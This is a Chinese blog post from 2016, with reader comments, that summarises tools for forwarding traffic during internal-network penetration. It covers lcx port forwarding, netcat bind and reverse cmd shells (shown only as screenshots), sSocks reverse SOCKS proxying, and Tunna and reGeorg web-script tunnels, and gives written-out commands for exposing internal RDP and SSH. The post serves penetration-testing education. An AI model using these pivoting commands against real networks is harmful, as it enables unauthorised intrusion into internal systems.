<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">内网渗透中转发工具总结</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">TwoEyes</a> <span class="bull">·</span> <time title="2016/04/27 10:44" ui-time="" datetime="2016/04/27 10:44" class="published ng-binding ng-isolate-scope">2016/04/27 10:44</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>最近一段时间内网渗透做的比较多，刚好今天比较有时间，就总结一下内网中转发的一些工具的使用。这里主要介绍了lcx、nc 、sSocket、tunna、reGeorg几款平时用的比较多的工具，网络上也有很多关于他们的介绍，而且也非常不错，但是并没有统一起来，写这篇文章就算是一个小小的汇总吧。</p><h1>0x00 LCX转发</h1><hr><p>内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口</p><p>例如：<code>lcx.exe –slave 192.168.43.142 51 192.168.43.137 3389</code></p><p>将内网(192.168.43.137)的3389端口转发到公网(192.168.43.142)的51端口</p><p><img alt="p1" img-src="f485cc084981f52bd321227d463fb03a781c0a01.jpg"></p><p>然后在公网的机器上：</p><p>Lcx.exe –listen 监听51端口，转发到公网机器的3389端口</p><p>例如：<code>Lcx.exe –listen 51 3389</code></p><p><img alt="p2" img-src="0a44302980a46f643986b4b7cb5048900ac8b78c.jpg"></p><p>这个时候已经将内网的3389转发到了公网机器的3389端口，我们在本地机器上远程公网IP+3389 ，就连接上了内网机器的3389</p><p><img alt="p3" img-src="79413a840e64afdc38eacc9e2fd00a7583608069.jpg"></p><h1>0x01 NC 反弹CMDshell</h1><hr><p>本机：192.168.43.142(win7) 远程机器：192.168.43.137(xp)</p><p><strong>正向连接：</strong></p><p>在远程机器上(t参数可以省略)</p><p><img alt="p4" img-src="8f947e01902d64e575819184b918440dcb9f63fe.jpg"></p><p>在本地机器上</p><p><img alt="p5" img-src="4916133dd75cad8421bd84095864bb62c16bf427.jpg"></p><p>成功之后，本地机器就获得了一个远程机器的shell</p><p><img alt="p6" img-src="738883d5e38818c60bbceaf31661ac24f2beeb8a.jpg"></p><p><strong>反向连接：</strong></p><p>在本机运行上</p><p><img alt="p7" img-src="0168cda852508fdcd862dda22d1e7a07c88dc329.jpg"></p><p>在远程机器上(t参数可以省略)</p><p><img alt="p8" img-src="164a01c5175d0d1fbbf586fac8980e6025afdda0.jpg"></p><p>然后成功之后，我们在本地机器上看一下，已经获得了远程机器的cmdshell</p><p><img alt="p9" img-src="9e94ac1af8fa3cf12d8618db0b5af97468ef6be2.jpg"></p><p>这里还有前人总结的十种反弹shell的方法，很不错</p><ul><li><a href="http://zone.wooyun.org/content/5064">http://zone.wooyun.org/content/5064</a> (wb>5)</li><li><a href="http://www.waitalone.cn/linux-shell-rebound-under-way.html">http://www.waitalone.cn/linux-shell-rebound-under-way.html</a></li></ul><h1>0x02 sSocket</h1><hr><p>一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试。</p><p>下载地址：<a href="https://sourceforge.net/projects/ssocks/">https://sourceforge.net/projects/ssocks/</a></p><p><img alt="p10" img-src="966e7f0b7ee9954f9a0328a57706475f2747b1ce.jpg"></p><p>先在vps 执行<code>rcsocket.exe –l 1088 –p 8888 –vv</code>, 监听1088端口</p><p><img alt="p11" img-src="b0e52b73b893c93687b86b5c12592befd1c2ae82.jpg"></p><p>内网机器执行<code>./rssocks –vv –s 192.168.30.103:8888</code>(VPS)</p><p><img alt="p12" img-src="bea0c145de44e5451b3f5bcd8baaa8cabe520b36.jpg"></p><p>成功，则会看到会话建立</p><p><img alt="p13" img-src="024659ae234015fa6af9d06917fcaa7215b40469.jpg"></p><p>设置代理，让本机可以通过VPS的1088端口访问内网机器。</p><p><img alt="14" img-src="68892da928bb69b87ae6ca4678e6dd68c7f45c39.jpg"></p><p>本机上 ssh 192.168.43.136内网主机</p><p><img alt="p15" img-src="62d80e473a49c0b57e6c50fedd38a69d91da3bb2.jpg"></p><p>成功ssh到内网机器</p><p><img alt="p16" img-src="14cdb0fc6ba860da1f8bcffc8e8758ef59fade91.jpg"></p><h1>0x03 Tunna 正向代理</h1><hr><p><a href="http://drops.wooyun.org/tools/650">参考</a></p><p><code>proxy.py -u http://xxx.com:206/test /conn.jsp -l 8888 -r 22 -v -s</code></p><p><img alt="p17" img-src="7d1c085d05245f5d26d7ddf4ecef8bceef8cdc04.jpg"></p><p>然后在xshell中执行<br>ssh 127.0.0.1 8888,看到下面的样子，说明已经成功了</p><p><img alt="p18" img-src="7b2fa31f81ab9a9d344f668885fab6a17a05f98c.jpg"></p><p><img alt="p19" img-src="5a4c39daade2d79f7eaacc9f0abcc37e014ce416.jpg"></p><p>同样的，如果内网的机器是windows，就把3389转出来</p><p><code>proxy.py -u http://xxx.com:206/test /conn.jsp -l 8888 -r 3389 -v</code></p><p>其中几个参数的解释：</p><ul><li>-l 表示本地监听的端口</li><li>-r 远程要转发的端口</li><li>-v 详细模式</li></ul><p>另外，如果脚本传到了内网A机器上，但是想登录内网B机器，那么可以-a参数指定机器</p><p>将内网中172.16.100.20主机的3389转发到本地<br><code>python2.7 proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -a 172.16.100.20 -r 3389</code></p><h1>0x04 reGeorg+proxifier 正向代理</h1><hr><p>reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高一些。这也是平时用的比较多的工具。</p><p>先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, 'All seems fine'”，表示脚本运行正常</p><p><img alt="p20" img-src="a39b91b674703e83e04b1f5c863b7aa90b26e292.jpg"></p><p>运行<code>python reGeorgSocksProxy.py -p 8888 -u http://www.xxx.com/tunnel.php</code></p><p><img alt="p21" img-src="15d3dd5bba57b1aafeaa8a380b1d1ba9f41da3ee.jpg"></p><p>将proxifier打开，在Proxy Server中这样配置</p><p><img alt="p22" img-src="b6d68489f509473379370b8bb1ed3d8b6c74b753.jpg"></p><p><img alt="p23" img-src="6839094e69de1ee7c0170db5e6d8e3fd95447d34.jpg"></p><p>然后就可以在本地访问内网的机器了</p><p><img alt="p24" img-src="2016042903552840012.png"></p><p>成功3389到内网机器</p><p><img alt="p25" img-src="70befdf66a0867f5fbc92214d6566251c7f417de.jpg"></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">blnxz</span> <span class="reply-time">2016-05-12 15:03:38</span></div><p></p><p>我现在遇到的情况，貌似只有regeorg+proxychains 可以将我的机子代理进入内网，其他的全不行。但是代理进去以后，目标机子的3389端口拒接 我的链接，他旁边的机子全部都无法访问，哪怕ping，或者扫描扫描的，全部不行。<br>现在的我代理进去内网以后，我感觉跟没代理进去差不多，大牛，还有什么其他方法的思路么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">google</span> <span class="reply-time">2016-05-02 23:47:35</span></div><p></p><p>用的都很多了，有更好的，更有意思的吗？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Whales-Of-Atlantis</span> <span class="weibo"></span> <span class="reply-time">2016-04-29 08:49:13</span></div><p></p><p>炒冷饭</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">qglfnt</span> <span class="reply-time">2016-04-28 14:55:00</span></div><p></p><p>不错，学习了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Cacker</span> <span class="reply-time">2016-04-28 12:01:57</span></div><p></p><p>6666666666学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">SLAckEr</span> <span class="reply-time">2016-04-28 11:17:19</span></div><p></p><p>请求转载</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">360安全中心</span> <span class="reply-time">2016-04-28 10:31:07</span></div><p></p><p>赞一个！总结得不错，如果加上优点与缺点就更完美了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">天神</span> <span class="reply-time">2016-04-28 10:30:18</span></div><p></p><p>@杨某某 因为公网vps开启了3389，端口会发生冲突。当然也可以直接转到公网3389，前提是vps3389没有开启</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">神在堕落</span> <span class="reply-time">2016-04-28 10:30:12</span></div><p></p><p>对于路由端口只做nat转发，且限定开放几个端口，内网机器无DNS，无法访问外网。这些端口转发的工具只能干着急。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">杨某某</span> <span class="reply-time">2016-04-28 09:36:41</span></div><p></p><p>一直好奇，为什么lcx不直接转发到公网的3389，而是公网服务器自己再转发一次，求解答</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">第四维度</span> <span class="reply-time">2016-04-28 07:50:11</span></div><p></p><p>reGeorg+proxifier 很好用</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">从容</span> <span class="reply-time">2016-04-27 19:24:52</span></div><p></p><p>@珈蓝夜宇 和我吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小葵</span> <span class="reply-time">2016-04-27 17:47:17</span></div><p></p><p>还有DNStunnel ICMPtunnel</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小葵</span> <span class="reply-time">2016-04-27 17:46:44</span></div><p></p><p>写的太少了吧。 redu phpsocks5 phproxy SSH msf htran kingate s5.py 期待大牛补充。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Jumbo</span> <span class="reply-time">2016-04-27 16:45:55</span></div><p></p><p>LZ，最后一个reGeorg，我代理以后，想连代理的那台机器的3389，mstsc那里输入127.0.0.1：端口和内网端口貌似都连不上。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">JotPot</span> <span class="reply-time">2016-04-27 15:43:59</span></div><p></p><p>@珈蓝夜宇 在一起在一起在一起</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小饼仔</span> <span class="reply-time">2016-04-27 14:45:14</span></div><p></p><p>@小胖子 这个比喻，666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">feiyu</span> <span class="reply-time">2016-04-27 13:58:49</span></div><p></p><p>赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">waht000</span> <span class="reply-time">2016-04-27 12:41:05</span></div><p></p><p>mark下</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">墨染</span> <span class="reply-time">2016-04-27 12:35:33</span></div><p></p><p>mark下，regeorg的那个学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xd-a8</span> <span class="reply-time">2016-04-27 11:57:43</span></div><p></p><p>必须关注</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">被抢走ID的CF_HB</span> <span class="weibo"></span> <span class="reply-time">2016-04-27 11:30:09</span></div><p></p><p>收藏</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cf_hb</span> <span class="reply-time">2016-04-27 11:21:04</span></div><p></p><p>赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">珈蓝夜宇</span> <span class="reply-time">2016-04-27 11:04:35</span></div><p></p><p>赞赞赞.想要和你生孩子.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小胖子</span> <span class="reply-time">2016-04-27 11:04:22</span></div><p></p><p>基本都是常见杀招，必须得会，有时候一种姿势不能高潮，得多用几种姿势。</p><p></p></div></div></div></div></div></main>